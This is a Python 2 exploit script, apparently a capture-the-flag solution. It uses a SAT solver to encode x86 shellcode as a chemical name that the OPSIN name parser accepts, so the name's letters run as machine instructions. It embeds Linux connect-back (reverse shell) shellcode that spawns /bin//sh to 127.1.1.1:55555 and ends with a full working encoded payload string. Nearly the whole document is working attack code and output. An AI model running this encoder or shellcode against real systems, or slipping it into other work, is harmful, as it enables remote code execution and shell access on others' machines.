# This script as-is takes about an hour to run on my laptop.
# It can be a lot faster if you fiddle with the shellcode payload by inserting nops in
# it (because some 4-byte strings are MUCH easier for `manipulate_eax` to generate than
# others, in a kind of chaotic way).
from struct import pack, unpack
from itertools import product
import cPickle


from subprocess import check_output
def check(name):
  """Command to check if a chemical name is accepted.
  ...because I'm lazy it only works if the chemical has a long carbon chain in it."""
  return "CCCCCCCCCC" in check_output([
    "ssh",
    "xenial.local",
    "echo '"+name+"' | java -jar ~/TNT/opsin-2.1.0-jar-with-dependencies.jar 2>&1 | grep CCCCCCCCCCCCCCC || true"
  ])

assert check("hectane")
assert not check("not existane")


CACHEFILE = '/tmp/chemcache'
try:
  CACHE = cPickle.load(open(CACHEFILE))
  print "got cache"
except:
  CACHE = {}


# z3 was being too slow so I switched to boolector.
# Note that using any SMT solver is a horrendously inefficient generation method
# here; I just throw everything at a solver because I'm lazy (._.)
# from z3 import *
from boolector import Boolector
def manipulate_eax(start_eax, end_eax):
  """This function generates part of a chemical name.
  The output string will function as x86 code to set eax to `end_eax`,
  assuming that it started as `start_eax`.
  This may clobber the stack, esp, ecx, esi, edx... maybe more? not ebp though."""
  end_eax&=0xFFFFFFFF
  start_eax&=0xFFFFFFFF
  print start_eax, '>>>', end_eax
  cache_key = (start_eax, end_eax)
  if cache_key in CACHE:
    return CACHE[cache_key]

  #############################################
  # Boolector compat shim
  B = Boolector()
  B.Set_opt('incremental',1)
  B.Set_opt('model_gen',2)
  sat = B.SAT
  ULT = B.Ult
  def BitVec(name, width):
    return B.Var(width, name)
  def Or(*args):
    return reduce(B.Or, args)
  class Solver():
    def __init__(self):
      self.is_pushed = False
    def push(self):
      assert not self.is_pushed
      self.is_pushed = True
    def pop(self):
      assert self.is_pushed
      self.is_pushed = False
    def add(self, *constraints):
      if self.is_pushed:
        B.Assume(*constraints)
      else:
        B.Assert(*constraints)
    def check(self):
      return B.Sat()
    def model(self):
      class Val(object):
        def __init__(self, v):
          self.v = v
        def as_long(self):
          if isinstance(self.v, (int,long)):
            return long(self.v)
          else:
            return int(self.v, 2)
      class Model(object):
        def __getitem__(self, k):
          if isinstance(k, (int,long)):
            return Val(k)
          else:
            return Val(k.assignment)
      return Model()
  ####################################################

  # These lists were generated by just searching for length 3 and 4 substituents from
  # https://github.com/metamolecular/opsin/blob/master/opsin-core/src/main/resources/uk/ac/cam/ch/wwmm/opsin/resources
  # that seemed to generally play well together in fron of a higher alkane, e.g. `aza arsa amyl hectane`
  valid3n = ['aza', 'boc', 'cbz', 'oxa', 'oxo', 'tms']
  valid4n = ['arsa', 'aura', 'bara', 'bora', 'cera', 'cura', 'erba', 'inda', 'ioda', 'osma', 'rada', 'sila', 'soda', 'thia']
  valid4n += ['amyl', 'oxyl', 'keto', 'arso', 'fmoc', 'iodo']

  valid4n.extend(i+' ' for i in valid3n)

  startvar = BitVec('start', 32)
  startstuff = ['Rhena ', 'Thiyl ', 'Rhoda ', 'Thora ', 'Thula '] # `h` is `push imm32`
  allowed_starts = {}
  for thing in startstuff:
    assert thing[-5] == 'h'
    assert thing[-1] == ' '
    for i in product(*[
      (thing[-4].upper(), thing[-4].lower()),
      (thing[-3].upper(), thing[-3].lower()),
      (thing[-2].upper(), thing[-2].lower()),
      (' ', '-'),
    ]):
      joined = ''.join(i)
      allowed_starts[unpack('<I', joined)[0]-0x20202020] = thing[:-4]+joined

  S = Solver()

  S.add(Or(*[startvar == k for k in [start_eax]+list(allowed_starts)]))

  startxor = BitVec('startxor', 32)
  S.add(Or(*[startxor == unpack('<I', i)[0] for i in valid4n]))  # Could also use 0 by starting with 'di-' but whatever.

  fudge = 0
  fudge = BitVec('fudge', 32)
  prefudge = 0
  # prefudge = BitVec('prefudge', 32)
  # S.add(ULT(prefudge, 5))

  subs = []
  did_not_work = set()
  counter = 0
  skip_counter = 0
  while counter < 40:
    print counter
    if len(subs) <= counter:
      subi = BitVec('sub%d' % counter, 32)
      subs.append(subi)
    val = (startvar-prefudge) ^ startxor
    for x in subs:
      val -= x
    S.push()
    S.add(ULT(fudge, counter+1))
    S.add(Or(*[subi == unpack('<I', i+c)[0] for i in valid3n for c in ' -']))
    S.add(val-fudge == end_eax)
    if skip_counter < max(10, counter/2) and S.check() == sat:
        m = S.model()
        out = ''
        # out += 'PHOSPha   '*m[prefudge].as_long()
        if m[startvar].as_long() != start_eax & 0xFFFFFFFF:
          out += allowed_starts[m[startvar].as_long()] + 'OXA-    ' # `X` is `pop eax`
        out += '5' + pack('<I', m[startxor].as_long()) # `5` is `xor eax, imm32`
        for i in subs:
          out += '-' + pack('<I', m[i].as_long()) # `-` is `sub eax, imm32`
        
        out += 'PHOSPha   '*m[fudge].as_long()
        
        #
        # `out` doesn't always work. I don't know enough chemistry to say why,
        # but just asking the sat solver for different solutions seems to work okay.
        # If it doesn't work, we blacklist it and move on.
        #
        ttt = frozenset(pack('<I', m[i].as_long()) for i in subs)
        if ttt not in did_not_work and check(out + ' hectane'):
          CACHE[cache_key] = out
          try:
            CACHE.update(cPickle.load(open(CACHEFILE)))
          except:
            pass
          cPickle.dump(CACHE, open(CACHEFILE, 'w'))
          return out
        did_not_work.add(ttt)
        S.pop()
        S.add(Or(*[i != m[i].as_long() for i in subs]))  # blacklist failed solution from the solver.
        skip_counter += 1
    else:
      S.pop()
      skip_counter = 0
      counter += 1
      S.add(Or(*[subi == unpack('<I', i)[0] for i in valid4n]))
  else:
    return None


real_target_skip = 4000 # This should be greater than the output name, but not too much greater.
current_eax = 0x2468000 # What the shellcode executor initializes eax to.

# Account for the fact that our write primitive is something like `...inc ebp; xor [ebp+0x4e], eax;...`
target_skip = real_target_skip - 0x4e - 1

x = '['
target = 0x2468000 + target_skip + 0x20202021
x += manipulate_eax(current_eax, target)
current_eax = target
x += 'HECTANE]-    '
current_eax -= 1 # H is `dec eax`
current_eax -= 0x20202020 # '-    ' is `sub eax, 0x20202020`
### Now, eax is 0x2468000 + target_skip

### Set ebp to be our output pointer (which is currently in eax).
x += "[PROPIO]-    "  # Something like `...push eax...pop ebp`
current_eax -= 0x20202020 # '-    '

# connect back shellcode.
shellcode = (
  "\x68"
  "\x7f\x01\x01\x01"  # 127.1.1.1
  "\x5e\x66\x68"
  "\xd9\x03"          # 55555
  "\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
  "\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
  "\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
  "\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
  "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
  "\xeb\xce")


# this hack lets us absorb a leading '\x00',
# which is good because we use "\x00\x00" as a
# nopslide into the shellcode and there may not
# be an even number of null bytes.
shellcode = "\x48\x27" + shellcode

while shellcode:
  print '>>>', len(shellcode)/4, '<<<'
  # Set eax to fragments of the shellcode
  x += '['
  target = unpack('<I', shellcode[:4].ljust(4, '\x00'))[0]
  shellcode = shellcode[4:]
  target += 0x74636568 # balange the `-hect` below.
  x += manipulate_eax(current_eax, target)
  current_eax = target
  
  # This fragment does 2 relevant things:
  # * `xor [ebp+0x4e],eax` (after subtracting from eax a bit, accounted for above)
  # * `inc ebp` x4
  x += 'NEPTUNA-hect1ENE]-   hECTENE-    '
  current_eax -= 0x74636568 # '-hect'
  current_eax -= 0x68202020 # '-   h'
  current_eax -= 0x20202020 # '-    '

# We set eax to be a valid pointer, in order to make '\x00\x00' a nopsled
x += '['
x += manipulate_eax(current_eax, 0x02468200-2+0x20202020)
x += 'HECTENE]-    '

x += 'HECTANE' # End the chemical

print len(x), real_target_skip
if len(x) <= real_target_skip:
  print "good to go!"
print repr(x)

# working example: '[ThiYl-OXA-    5cbz -soda-tms -oxa -tms -fmoc-keto-cbz -keto-osma-fmoc-tms PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   HECTANE]-    [PROPIO]-    [RheNA-OXA-    5cbz -iodo-iodo-fmoc-iodo-fmoc-bara-cura-thia-fmoc-iodo-aza-PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThORA OXA-    5fmoc-fmoc-cera-ioda-rada-amyl-iodo-oxa-PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThorA OXA-    5fmoc-arso-sila-cbz -thia-cbz -cbz -cbz -oxyl-tms -iodo-soda-cura-amyl-cbz -oxyl-oxyl-keto-osma-cbz -tms PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [RheNA OXA-    5fmoc-tms -thia-amyl-bora-arsa-thia-fmoc-oxo PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThiyL OXA-    5fmoc-oxa -boc -oxyl-oxa -oxa -oxa -boc -oxa -sila-thia-osma-tms PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThoRA OXA-    5fmoc-iodo-oxyl-cbz -erba-ioda-aza-PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [5oxyl-cura-amyl-amyl-bora-aura-cera-amyl-iodo-arso-iodo-fmoc-fmoc-oxo -oxa PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThULa-OXA-    5erba-arsa-arsa-amyl-cera-bora-thia-thia-rada-amyl-cbz -aura-cera-cera-cera-bara-boc-PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThIYl OXA-    5tms -aza -tms -fmoc-cbz -arso-arso-bora-cbz-PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThORA-OXA-    5tms -bara-cbz -fmoc-cbz -iodo-aza -oxa -cura-oxa -bara-amyl-amyl-cera-rada-cbz-PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThuLA OXA-    5fmoc-oxyl-oxyl-iodo-rada-tms -oxyl-aza -cbz-PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThIYL-OXA-    5tms -erba-thia-erba-fmoc-bora-aza -bora-cera-erba-aza PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [RhOdA OXA-    5boc -oxyl-oxo -ioda-aza -aza -soda-thia-ioda-oxa -oxa -aza -oxa -aza -aza-PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThORA-OXA-    5amyl-amyl-amyl-oxo -boc -cera-amyl-rada-fmoc-keto-cbz PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [5arso-tms -amyl-erba-tms -bora-tms -thia-tms -fmoc-tms-PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [RheNa OXA-    5fmoc-oxyl-oxyl-ioda-bara-tms -thia-thia-rada-tms -tms -thia-tms -inda-soda-aza PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [RhenA-OXA-    5boc -thia-sila-sila-fmoc-thia-tms -tms -tms NEPTUNA-hect1ENE]-   hECTENE-    [RhOda OXA-    5boc -cbz -cbz -amyl-cbz -amyl-cbz -arso-amyl-arsa-fmoc-amyl-aura-bara-aza-NEPTUNA-hect1ENE]-   hECTENE-    [ThorA OXA-    5cbz -amyl-arso-thia-keto-iodo-iodo-boc PHOSPha   PHOSPha   PHOSPha   PHOSPha   NEPTUNA-hect1ENE]-   hECTENE-    [ThiyL OXA-    5amyl-erba-ioda-osma-fmoc-boc -aza -oxa -aza -aza -oxa PHOSPha   PHOSPha   PHOSPha   PHOSPha   HECTENE]-    HECTANE'

